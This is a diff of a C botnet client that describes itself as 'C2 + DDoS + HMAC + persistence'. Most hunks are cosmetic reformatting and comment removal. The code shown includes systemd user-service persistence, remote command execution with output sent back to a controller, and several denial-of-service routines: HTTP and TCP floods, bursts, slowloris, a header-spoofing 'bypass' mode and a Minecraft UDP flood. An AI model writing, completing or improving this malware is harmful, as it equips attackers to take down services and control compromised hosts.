@@ -1,4 +1,4 @@
-// client.c — C2 + DDoS + HMAC + persistence. v2.12
+// client.c — C2 + DDoS + HMAC + persistence. v2.12-fix
 // Linux:   gcc -O2 -Wall -Wextra client.c -o client -lpthread
 // Windows: cl /O2 client.c ws2_32.lib advapi32.lib
 
@@ -44,6 +44,7 @@
   #define INVALID_SOCK (-1)
   #define SLEEP_MS(ms) safe_sleep_ms(ms)
   #define THREAD_HANDLE pthread_t
+  #define THREAD_CREATE(h,f,a) pthread_create(&(h),NULL,(f),(a))
   #define THREAD_JOIN(h) do{ if(h) pthread_join((h),NULL);}while(0)
   typedef void *(*thread_fn)(void *);
 #endif
@@ -206,7 +207,7 @@ static void hash8_hex(const char *s,char out[9]){
     out[8]=0;
 }
 
-/* PSK parsing: строгая валидация hex + точное сообщение об ошибке */
+/* PSK parsing */
 static int parse_hex32(const char *s,unsigned char out[32]){
     if(!s||strlen(s)!=64)return -1;
     for(int i=0;i<32;i++){
@@ -254,7 +255,7 @@ static int nonce_seen_add(const char *nonce,double ts){
     if(!nonce||strlen(nonce)!=16)return 1;
     double now=(double)time(NULL);
     if(ts-now>HMAC_WINDOW)return 1;
-    if(now-ts>HMAC_WINDOW)return 1; /* симметричная проверка */
+    if(now-ts>HMAC_WINDOW)return 1;
     NONCE_LOCK();
     for(int i=0;i<g_nonce_cnt;i++){
         if(strcmp(g_nonces[i].nonce,nonce)==0&&now-g_nonces[i].ts<NONCE_TTL){
@@ -315,7 +316,6 @@ static int json_get_int(const char *j,const char *k,int *out){
 static int send_all(sock_t fd,const char *b,int len){
     int s=0;while(s<len){int n=send(fd,b+s,len-s,0);if(n==SOCK_ERR||n<=0)return -1;s+=n;}return s;
 }
-/* Копируем fd под SEND_LOCK, шлём без лока — не блокируем другие потоки */
 static int send_frame_raw(const char *json){
     if(!CONN_ALIVE())return -1;
     SEND_LOCK();sock_t fd=g_fd;SEND_UNLOCK();
@@ -434,7 +434,8 @@ static void send_result(const char *cmd_id,int code,int timed_out){
     send_frame_raw(frame);
 }
 static void send_out(const char *cmd_id,const char *stream,const char *data,int len){
-    if(len<=0)return;if(len>OUT_CHUNK)len=OUT_CHUNK;
+    if(len<=0) return;
+    if(len>OUT_CHUNK) len=OUT_CHUNK;
     char esc[OUT_CHUNK*2+16];json_escape(data,len,esc,sizeof(esc));
     char nonce[17];gen_nonce(nonce,sizeof(nonce));
     int ts=(int)time(NULL);
@@ -493,7 +494,7 @@ static int install_persist_linux(const char *exe,char *err,int errmax){
             "StandardOutput=null\nStandardError=null\n\n"
             "[Install]\nWantedBy=default.target\n",dst);
         fclose(u);
-        system("/usr/bin/loginctl enable-linger $USER >/dev/null 2>&1");
+        if(system("/usr/bin/loginctl enable-linger $USER >/dev/null 2>&1") != 0) {}
         int rc=system("/usr/bin/systemctl --user daemon-reload >/dev/null 2>&1");
         rc|=system("/usr/bin/systemctl --user enable c2-agent.service >/dev/null 2>&1");
         rc|=system("/usr/bin/systemctl --user start c2-agent.service >/dev/null 2>&1");
@@ -514,8 +515,8 @@ static int install_persist_linux(const char *exe,char *err,int errmax){
 static int uninstall_persist_linux(char *err,int errmax){
     (void)err;(void)errmax;
     const char *home=getenv("HOME");if(!home)return -1;
-    system("/usr/bin/systemctl --user stop c2-agent.service >/dev/null 2>&1");
-    system("/usr/bin/systemctl --user disable c2-agent.service >/dev/null 2>&1");
+    if(system("/usr/bin/systemctl --user stop c2-agent.service >/dev/null 2>&1") != 0) {}
+    if(system("/usr/bin/systemctl --user disable c2-agent.service >/dev/null 2>&1") != 0) {}
     char p[512];
     snprintf(p,sizeof(p),"%s/.config/systemd/user/c2-agent.service",home);unlink(p);
     snprintf(p,sizeof(p),"%s/.local/share/c2-agent/c2-agent",home);unlink(p);
@@ -622,7 +623,7 @@ static int dd_gen_get(void){
 #endif
 }
 
-/* xorshift32 — потокобезопасный, портабельный */
+/* xorshift32 */
 static unsigned int dd_rand(unsigned int *seed){
     unsigned int x=*seed;
     x^=x<<13; x^=x>>17; x^=x<<5;
@@ -672,7 +673,7 @@ static sock_t connect_to(const struct sockaddr_in *srv,int timeout_ms){
     u_long b=0;ioctlsocket(s,FIONBIO,&b);
     DWORD snd=DD_SND_TIMEOUT_MS;setsockopt(s,SOL_SOCKET,SO_SNDTIMEO,(char*)&snd,sizeof(snd));
 #else
-    int fl=fcntl(s,F_GETFL,0);fcntl(s,F_SETFL,fl&~O_NONBLOCK);
+    int fl2=fcntl(s,F_GETFL,0);fcntl(s,F_SETFL,fl2&~O_NONBLOCK);
     struct timeval snd={DD_SND_TIMEOUT_MS/1000,(DD_SND_TIMEOUT_MS%1000)*1000};
     setsockopt(s,SOL_SOCKET,SO_SNDTIMEO,&snd,sizeof(snd));
 #endif
@@ -726,9 +727,13 @@ static void dd_worker_http_flood(void){
     char req[1024];const char *p=path[0]?path:"/";
     snprintf(req,sizeof(req),"GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n",p,host);
     int rlen=(int)strlen(req);
-    while(!dd_stop()){sock_t s=connect_to(&srv,CONNECT_TIMEOUT_MS);if(s==INVALID_SOCK){SLEEP_MS(10);continue;}
-        if(send(s,req,rlen,0)>0)dd_inc(1);CLOSE_SOCK(s);
-        if(delay_ms>0)SLEEP_MS(delay_ms);}
+    while(!dd_stop()){
+        sock_t s=connect_to(&srv,CONNECT_TIMEOUT_MS);
+        if(s==INVALID_SOCK){SLEEP_MS(10);continue;}
+        if(send(s,req,rlen,0)>0)dd_inc(1);
+        CLOSE_SOCK(s);
+        if(delay_ms>0)SLEEP_MS(delay_ms);
+    }
 }
 static void dd_worker_http_burst(void){
     char host[256], path[512]; int port, delay_ms;
@@ -742,10 +747,15 @@ static void dd_worker_http_burst(void){
     char req[1024];const char *p=path[0]?path:"/";
     snprintf(req,sizeof(req),"GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n",p,host);
     int rlen=(int)strlen(req);int burst=64;
-    while(!dd_stop()){for(int i=0;i<burst&&!dd_stop();i++){
-        sock_t s=connect_to(&srv,CONNECT_TIMEOUT_MS);if(s==INVALID_SOCK)continue;
-        if(send(s,req,rlen,0)>0)dd_inc(1);CLOSE_SOCK(s);}
-        if(delay_ms>0)SLEEP_MS(delay_ms);else SLEEP_MS(10);}
+    while(!dd_stop()){
+        for(int i=0;i<burst&&!dd_stop();i++){
+            sock_t s=connect_to(&srv,CONNECT_TIMEOUT_MS);
+            if(s==INVALID_SOCK)continue;
+            if(send(s,req,rlen,0)>0)dd_inc(1);
+            CLOSE_SOCK(s);
+        }
+        if(delay_ms>0)SLEEP_MS(delay_ms);else SLEEP_MS(10);
+    }
 }
 static void dd_worker_http_bypass(void){
     char host[256]; int port, delay_ms;
@@ -758,12 +768,17 @@ static void dd_worker_http_bypass(void){
     struct sockaddr_in srv;if(resolve_target(host,port,&srv)<0)return;
     const char *uas[]={"Mozilla/5.0 (Windows NT 10.0)","Mozilla/5.0 (Macintosh)","Mozilla/5.0 (X11; Linux x86_64)"};
     const char *paths[]={"/","/index.html","/api","/login","/wp-admin","/?id=1"};
-    while(!dd_stop()){sock_t s=connect_to(&srv,CONNECT_TIMEOUT_MS);if(s==INVALID_SOCK){SLEEP_MS(10);continue;}
+    while(!dd_stop()){
+        sock_t s=connect_to(&srv,CONNECT_TIMEOUT_MS);
+        if(s==INVALID_SOCK){SLEEP_MS(10);continue;}
         char req[1024];int ri=dd_rand(&seed)%3,pi=dd_rand(&seed)%6;
         snprintf(req,sizeof(req),"GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nX-Forwarded-For: %d.%d.%d.%d\r\nAccept: text/html\r\nConnection: close\r\n\r\n",
             paths[pi],host,uas[ri],(dd_rand(&seed)%255)+1,(dd_rand(&seed)%255)+1,(dd_rand(&seed)%255)+1,(dd_rand(&seed)%255)+1);
-        if(send(s,req,strlen(req),0)>0)dd_inc(1);SLEEP_MS(dd_rand(&seed)%100);CLOSE_SOCK(s);
-        if(delay_ms>0)SLEEP_MS(delay_ms);}
+        if(send(s,req,strlen(req),0)>0)dd_inc(1);
+        SLEEP_MS(dd_rand(&seed)%100);
+        CLOSE_SOCK(s);
+        if(delay_ms>0)SLEEP_MS(delay_ms);
+    }
 }
 static void dd_worker_http_slowloris(void){
     char host[256]; int port;
@@ -774,11 +789,19 @@ static void dd_worker_http_slowloris(void){
 
     unsigned int seed = dd_seed_init();
     struct sockaddr_in srv;if(resolve_target(host,port,&srv)<0)return;
-    while(!dd_stop()){sock_t s=connect_to(&srv,CONNECT_TIMEOUT_MS);if(s==INVALID_SOCK){SLEEP_MS(100);continue;}
+    while(!dd_stop()){
+        sock_t s=connect_to(&srv,CONNECT_TIMEOUT_MS);
+        if(s==INVALID_SOCK){SLEEP_MS(100);continue;}
         char line[128];int n=snprintf(line,sizeof(line),"GET /%d HTTP/1.1\r\nHost: %s\r\n",dd_rand(&seed)&0xFFFF,host);
         if(send(s,line,n,0)>0)dd_inc(1);
-        for(int i=0;i<20&&!dd_stop();i++){char hdr[]="X-a: b\r\n";if(send(s,hdr,1,0)<=0)break;dd_inc(1);SLEEP_MS(500);}
-        CLOSE_SOCK(s);}
+        for(int i=0;i<20&&!dd_stop();i++){
+            char hdr[]="X-a: b\r\n";
+            if(send(s,hdr,1,0)<=0)break;
+            dd_inc(1);
+            SLEEP_MS(500);
+        }
+        CLOSE_SOCK(s);
+    }
 }
 static void dd_worker_tcp_flood(void){
     char host[256]; int port, pktsize, delay_ms;
@@ -791,9 +814,13 @@ static void dd_worker_tcp_flood(void){
     char *p=(char*)malloc(pktsize);if(!p)return;
     for(int i=0;i<pktsize;i++)p[i]=(char)(dd_rand(&seed)&0xFF);
     struct sockaddr_in srv;if(resolve_target(host,port,&srv)<0){free(p);return;}
-    while(!dd_stop()){sock_t s=connect_to(&srv,CONNECT_TIMEOUT_MS);if(s==INVALID_SOCK){SLEEP_MS(10);continue;}
-        if(send(s,p,pktsize,0)>0)dd_inc(1);CLOSE_SOCK(s);
-        if(delay_ms>0)SLEEP_MS(delay_ms);}
+    while(!dd_stop()){
+        sock_t s=connect_to(&srv,CONNECT_TIMEOUT_MS);
+        if(s==INVALID_SOCK){SLEEP_MS(10);continue;}
+        if(send(s,p,pktsize,0)>0)dd_inc(1);
+        CLOSE_SOCK(s);
+        if(delay_ms>0)SLEEP_MS(delay_ms);
+    }
     free(p);
 }
 static void dd_worker_tcp_burst(void){
@@ -808,10 +835,15 @@ static void dd_worker_tcp_burst(void){
     for(int i=0;i<pktsize;i++)p[i]=(char)(dd_rand(&seed)&0xFF);
     struct sockaddr_in srv;if(resolve_target(host,port,&srv)<0){free(p);return;}
     int burst=64;
-    while(!dd_stop()){for(int i=0;i<burst&&!dd_stop();i++){
-        sock_t s=connect_to(&srv,CONNECT_TIMEOUT_MS);if(s==INVALID_SOCK)continue;
-        if(send(s,p,pktsize,0)>0)dd_inc(1);CLOSE_SOCK(s);}
-        if(delay_ms>0)SLEEP_MS(delay_ms);else SLEEP_MS(10);}
+    while(!dd_stop()){
+        for(int i=0;i<burst&&!dd_stop();i++){
+            sock_t s=connect_to(&srv,CONNECT_TIMEOUT_MS);
+            if(s==INVALID_SOCK)continue;
+            if(send(s,p,pktsize,0)>0)dd_inc(1);
+            CLOSE_SOCK(s);
+        }
+        if(delay_ms>0)SLEEP_MS(delay_ms);else SLEEP_MS(10);
+    }
     free(p);
 }
 static void dd_worker_tcp_slowloris(void){
@@ -823,9 +855,17 @@ static void dd_worker_tcp_slowloris(void){
 
     unsigned int seed = dd_seed_init();
     struct sockaddr_in srv;if(resolve_target(host,port,&srv)<0)return;
-    while(!dd_stop()){sock_t s=connect_to(&srv,CONNECT_TIMEOUT_MS);if(s==INVALID_SOCK){SLEEP_MS(100);continue;}
-        for(int i=0;i<20&&!dd_stop();i++){char b=(char)(dd_rand(&seed)&0xFF);if(send(s,&b,1,0)<=0)break;dd_inc(1);SLEEP_MS(500);}
-        CLOSE_SOCK(s);}
+    while(!dd_stop()){
+        sock_t s=connect_to(&srv,CONNECT_TIMEOUT_MS);
+        if(s==INVALID_SOCK){SLEEP_MS(100);continue;}
+        for(int i=0;i<20&&!dd_stop();i++){
+            char b=(char)(dd_rand(&seed)&0xFF);
+            if(send(s,&b,1,0)<=0)break;
+            dd_inc(1);
+            SLEEP_MS(500);
+        }
+        CLOSE_SOCK(s);
+    }
 }
 static void dd_worker_mc(void){
     char host[256]; int port, delay_ms;
@@ -855,7 +895,8 @@ static void dd_worker_mc(void){
     while(!dd_stop()){
         if(sendto(s,(const char*)hs,p,0,(struct sockaddr*)&srv,sizeof(srv))>0)dd_inc(1);
         if(sendto(s,(const char*)rq,sizeof(rq),0,(struct sockaddr*)&srv,sizeof(srv))>0)dd_inc(1);
-        if(delay_ms>0)SLEEP_MS(delay_ms);else SLEEP_MS(5);}
+        if(delay_ms>0)SLEEP_MS(delay_ms);else SLEEP_MS(5);
+    }
     CLOSE_SOCK(s);
 }
 
@@ -887,6 +928,7 @@ static DWORD WINAPI dd_stats_entry(LPVOID arg){
 #else
 static void *dd_stats_entry(void *arg){
 #endif
+    (void)arg;
     char cid[CMD_ID_LEN+1];DD_LOCK();memcpy(cid,g_dd_cmd_id,CMD_ID_LEN);cid[CMD_ID_LEN]=0;DD_UNLOCK();
     int last=0;
     while(!dd_stop()){
@@ -898,7 +940,6 @@ static void *dd_stats_entry(void *arg){
         char data[64];snprintf(data,sizeof(data),"pps=%d total=%d",pps,tot);
         send_out(cid,"stats",data,(int)strlen(data));
     }
-    /* финальный stats перед завершением — чтобы UI увидел актуальный total */
     int tot=(int)g_dd.total_packets;
     char data[64];snprintf(data,sizeof(data),"pps=0 total=%d",tot);
     send_out(cid,"stats",data,(int)strlen(data));
@@ -928,7 +969,6 @@ static DWORD WINAPI dd_supervisor_entry(LPVOID arg){(void)arg;dd_supervisor_inne
 static void *dd_supervisor_entry(void *arg){(void)arg;dd_supervisor_inner();return NULL;}
 #endif
 
-/* Внутренняя — вызывается только под DD_OP_LOCK */
 static void dd_finish_locked(const char *ext_cid,int send_res){
     DD_LOCK();
     int was=g_dd.active,my_gen=dd_gen_get(),n=g_dd.nworkers;
@@ -941,7 +981,6 @@ static void dd_finish_locked(const char *ext_cid,int send_res){
     DD_UNLOCK();
     if(was){for(int i=0;i<n;i++)THREAD_JOIN(workers[i]);if(stats)THREAD_JOIN(stats);}
     if(send_res==0 && was){
-        /* единый CAS — ровно один результат на generation */
         if(dd_result_test_set()){
             send_out(cid,"stdout","ddos stopped",12);
             send_result(cid,0,0);
@@ -955,7 +994,6 @@ static void dd_stop_from_cmd(const char *cid){
     DD_OP_UNLOCK();
 }
 
-/* строгий парсер int с fallback */
 static int parse_int_strict(const char *js,const char *key,int def){
     int v=def;
     if(!json_get_int(js,key,&v))return def;
@@ -995,7 +1033,6 @@ static void dd_start(const char *cmd,const char *cmd_id){
      if(*p=='/')strncpy(path,p,sizeof(path)-1);
      else if(m==DD_HTTP_FLOOD||m==DD_HTTP_BURST||m==DD_HTTP_BYPASS||m==DD_HTTP_SLOWLORIS)strcpy(path,"/");}
     if(!host[0]||port<=0||port>65535){DD_OP_UNLOCK();send_result(cmd_id,-2,0);return;}
-    /* дожидаемся полной остановки предыдущей атаки — под DD_OP_LOCK никто не влезет */
     for(;;){DD_LOCK();int a=g_dd.active;DD_UNLOCK();if(!a)break;dd_finish_locked(NULL,-1);}
     DD_LOCK();
     memset(&g_dd,0,sizeof(g_dd));
@@ -1011,7 +1048,11 @@ static void dd_start(const char *cmd,const char *cmd_id){
 #endif
     strncpy(g_dd_cmd_id,cmd_id,CMD_ID_LEN);g_dd_cmd_id[CMD_ID_LEN]=0;
     int started=0;
-    for(int i=0;i<threads;i++){THREAD_HANDLE h=0;THREAD_CREATE(h,dd_thread_entry,(void*)(uintptr_t)m);if(h)g_dd.workers[started++]=h;}
+    for(int i=0;i<threads;i++){
+        THREAD_HANDLE h=0;
+        THREAD_CREATE(h,dd_thread_entry,(void*)(uintptr_t)m);
+        if(h)g_dd.workers[started++]=h;
+    }
     g_dd.nworkers=started;
     if(started==0){g_dd.active=0;DD_UNLOCK();DD_OP_UNLOCK();send_result(cmd_id,-5,0);return;}
     THREAD_HANDLE sh=0;THREAD_CREATE(sh,dd_stats_entry,NULL);g_dd.stats_thr=sh;
@@ -1031,11 +1072,15 @@ static void dd_start(const char *cmd,const char *cmd_id){
 #ifndef _WIN32
 static int now_ms(void){struct timespec ts;clock_gettime(CLOCK_MONOTONIC,&ts);return (int)(ts.tv_sec*1000+ts.tv_nsec/1000000);}
 static int drain(int fd,const char *cid,const char *stream){
-    char b[OUT_CHUNK];while(1){ssize_t n=read(fd,b,sizeof(b));
+    char b[OUT_CHUNK];
+    while(1){
+        ssize_t n=read(fd,b,sizeof(b));
         if(n>0){send_out(cid,stream,b,(int)n);continue;}
         if(n==0)return 1;
         if(errno==EAGAIN||errno==EWOULDBLOCK)return 0;
-        if(errno==EINTR)continue;return 1;}
+        if(errno==EINTR)continue;
+        return 1;
+    }
 }
 static void run_and_report_linux(const char *cmd,const char *cid){
     int op[2],ep[2];
@@ -1048,15 +1093,25 @@ static void run_and_report_linux(const char *cmd,const char *cid){
     close(op[1]);close(ep[1]);fcntl(op[0],F_SETFL,O_NONBLOCK);fcntl(ep[0],F_SETFL,O_NONBLOCK);
     struct pollfd pf[2];pf[0].fd=op[0];pf[0].events=POLLIN;pf[1].fd=ep[0];pf[1].events=POLLIN;
     int ao=1,ae=1,timed=0,start=now_ms();
-    while(ao||ae){if(!CONN_ALIVE()){timed=1;kill(pid,SIGKILL);break;}
-        if(now_ms()-start>=CMD_TIMEOUT_MS){timed=1;kill(pid,SIGKILL);
-            if(ao)drain(op[0],cid,"stdout");if(ae)drain(ep[0],cid,"stderr");break;}
-        int r=poll(pf,2,POLL_SLICE_MS);if(r<0){if(errno==EINTR)continue;break;}
+    while(ao||ae){
+        if(!CONN_ALIVE()){timed=1;kill(pid,SIGKILL);break;}
+        if(now_ms()-start>=CMD_TIMEOUT_MS){
+            timed=1;kill(pid,SIGKILL);
+            if(ao)drain(op[0],cid,"stdout");
+            if(ae)drain(ep[0],cid,"stderr");
+            break;
+        }
+        int r=poll(pf,2,POLL_SLICE_MS);
+        if(r<0){if(errno==EINTR)continue;break;}
         if(r==0)continue;
-        if(ao){if(pf[0].revents&POLLIN){if(drain(op[0],cid,"stdout"))ao=0;}
-               if(pf[0].revents&(POLLHUP|POLLERR|POLLNVAL)){if(drain(op[0],cid,"stdout"))ao=0;}}
-        if(ae){if(pf[1].revents&POLLIN){if(drain(ep[0],cid,"stderr"))ae=0;}
-               if(pf[1].revents&(POLLHUP|POLLERR|POLLNVAL)){if(drain(ep[0],cid,"stderr"))ae=0;}}
+        if(ao){
+            if(pf[0].revents&POLLIN){if(drain(op[0],cid,"stdout"))ao=0;}
+            if(pf[0].revents&(POLLHUP|POLLERR|POLLNVAL)){if(drain(op[0],cid,"stdout"))ao=0;}
+        }
+        if(ae){
+            if(pf[1].revents&POLLIN){if(drain(ep[0],cid,"stderr"))ae=0;}
+            if(pf[1].revents&(POLLHUP|POLLERR|POLLNVAL)){if(drain(ep[0],cid,"stderr"))ae=0;}
+        }
     }
     close(op[0]);close(ep[0]);
     int st=0;
